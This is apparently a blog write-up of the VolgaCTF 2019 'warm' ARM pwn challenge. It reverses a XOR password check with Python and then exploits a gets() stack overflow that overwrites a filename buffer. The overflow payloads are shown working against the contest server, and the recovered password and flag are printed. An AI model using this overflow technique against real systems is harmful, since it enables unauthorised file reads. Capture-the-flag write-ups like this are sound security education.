---
layout:     post
title:      'VolgaCTF Qualifiers 2019 - warm'
date:       2019-03-31 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'VolgaCTF Qualifiers 2019'
---

Another week and another write up, this time from ***VolgaCTF Qualifiers*** we have a ***pwn*** challenge called ***warm*** rated at 100pts. Quite an annoying challenge with big troll at the last part of exploitation. Big kudos to [Yodak](https://twitter.com/Yodak5) for firstly reverse engineering the binary.  

We're given an `ARM` binary and a task. 

```
How fast can you sove it? nc warm.q.2019.volgactf.ru 443
```

Let's take a look at the file. 

```text
w3ndige@main ~/D/c/v/warm> file warm 
warm: ELF 32-bit LSB pie executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=c549628c0b3841a5fd9a23f0faaf6b51eb858e94, stripped
```

As usual we're gonna start with analyzing the code. As in the last challenge we had a good solution with `Ghidra`, we're once again going to give it a try. Let's load the binary and analyze it. 

As I'm not familiar with `ARM`, I'm just poking around the binary looking for anything useful and in `FUN_00010788` function, we can see a suspicious algorithm shown in pseudocode. 

![Ghidra View](/img/volgactf/ghidra-warm-disassembly.png){:class="img-responsive center-block"}

Let's copy it and analyze what it's doing. 

```c
undefined4 FUN_00010788(byte *pbParm1)

{
  size_t sVar1;
  undefined4 uVar2;
  
  sVar1 = strlen((char *)pbParm1);
  if (sVar1 < 0x10) {
    uVar2 = 1;
  }
  else {
    if (((((*pbParm1 == 0x76) && ((pbParm1[1] ^ *pbParm1) == 0x4e)) &&
         ((pbParm1[2] ^ pbParm1[1]) == 0x1e)) &&
        ((((pbParm1[3] ^ pbParm1[2]) == 0x15 && ((pbParm1[4] ^ pbParm1[3]) == 0x5e)) &&
         (((pbParm1[5] ^ pbParm1[4]) == 0x1c &&
          (((pbParm1[6] ^ pbParm1[5]) == 0x21 && ((pbParm1[7] ^ pbParm1[6]) == 1)))))))) &&
       (((pbParm1[8] ^ pbParm1[7]) == 0x34 &&
        ((((((pbParm1[9] ^ pbParm1[8]) == 7 && ((pbParm1[10] ^ pbParm1[9]) == 0x35)) &&
           ((pbParm1[0xb] ^ pbParm1[10]) == 0x11)) &&
          (((pbParm1[0xc] ^ pbParm1[0xb]) == 0x37 && ((pbParm1[0xd] ^ pbParm1[0xc]) == 0x3c)))) &&
         (((pbParm1[0xe] ^ pbParm1[0xd]) == 0x72 && ((pbParm1[0xf] ^ pbParm1[0xe]) == 0x47)))))))) {
      uVar2 = 0;
    }
    else {
      uVar2 = 2;
    }
  }
  return uVar2;
}
```

We can easily reverse it with Python for such a small input. 

```python
>>> params = []
>>> params.append(chr(0x76))
>>> params
['v']
>>> params.append(chr(0x76 ^ 0x4e))
>>> params.append(chr(ord(params[1]) ^ 0x1e))
>>> params.append(chr(ord(params[2]) ^ 0x15))
>>> params.append(chr(ord(params[3]) ^ 0x5e))
>>> params.append(chr(ord(params[4]) ^ 0x1c))
>>> params.append(chr(ord(params[5]) ^ 0x21))
>>> params.append(chr(ord(params[6]) ^ 0x1))
>>> params.append(chr(ord(params[7]) ^ 0x34))
>>> params.append(chr(ord(params[8]) ^ 0x7))
>>> params.append(chr(ord(params[9]) ^ 0x35))
>>> params.append(chr(ord(params[10]) ^ 0x11))
>>> params.append(chr(ord(params[11]) ^ 0x37))
>>> params.append(chr(ord(params[12]) ^ 0x3c))
>>> params.append(chr(ord(params[13]) ^ 0x72))
>>> params.append(chr(ord(params[14]) ^ 0x47))
>>> params
['v', '8', '&', '3', 'm', 'q', 'P', 'Q', 'e', 'b', 'W', 'F', 'q', 'M', '?', 'x']
>>> hex(len(params))
'0x10'
```

So there we have a password. But what else? Upon further examination, we can find another function reponsible for user input and general usage of the binary. Let's view the pseudocode.  

```c
undefined4 FUN_000109ec(void)

{
  int __c;
  FILE *__stream;
  char acStack220 [100];
  char acStack120 [100];
  int local_14;
  
  local_14 = __stack_chk_guard;
  setvbuf(stdout,(char *)0x0,2,0);
  while( true ) {
    while( true ) {
      FUN_000108f0(acStack120);
      puts("Hi there! I\'ve been waiting for your password!");
      gets(acStack220);
      __c = FUN_00010788(acStack220);
      if (__c == 0) break;
      FUN_00010978(1,0);
    }
    __stream = fopen(acStack120,"rb");
    if (__stream != (FILE *)0x0) break;
    FUN_00010978(2,acStack120);
  }
  while (__c = _IO_getc((_IO_FILE *)__stream), __c != -1) {
    putchar(__c);
  }
  fclose(__stream);
  if (local_14 == __stack_chk_guard) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

From a first look there may be stack based buffer overflow in `gets(acStack220);`. As the variable is `100` bytes, by supplying more that that we would be able to overflow it into a buffer that is higher on a stack, `acStack120`. By the way, this variable holds a name of the file to read, so we will be able to read any file on the system. 

Let's try that out. 

```text
w3ndige@main ~/D/c/v/warm> nc warm.q.2019.volgactf.ru 443
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag
Seek file with something more sacred!
```

Something more `sacred` had me up for quite a long time, but it was amazingly easy. What about the file called `sacred`? 

```text
w3ndige@main ~/D/c/v/warm> nc warm.q.2019.volgactf.ru 443
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasacred    
VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle}
```